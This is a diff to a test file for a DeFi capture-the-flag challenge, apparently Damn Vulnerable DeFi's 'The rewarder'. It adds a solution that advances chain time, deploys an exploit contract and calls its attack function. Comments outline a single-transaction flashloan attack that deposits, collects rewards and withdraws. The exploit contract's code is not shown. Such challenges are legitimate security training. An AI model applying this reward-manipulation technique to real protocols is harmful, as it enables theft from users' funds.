@@ -70,6 +70,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        // flashloan DVT tokens when isNewRewardsRound() is true, perform all below steps in one tx
+        // to return flashloan and get rewardtokens
+
+        let exploit = await (await ethers.getContractFactory('RewarderExploit', player)).deploy(rewarderPool.address, flashLoanPool.address);
+        await exploit.connect(player).attack();
+        // 1. deposit
+        // -> distributeRewards
+        // 2. receive rewards
+        // 3. withdraw
     });
 
     after(async function () {
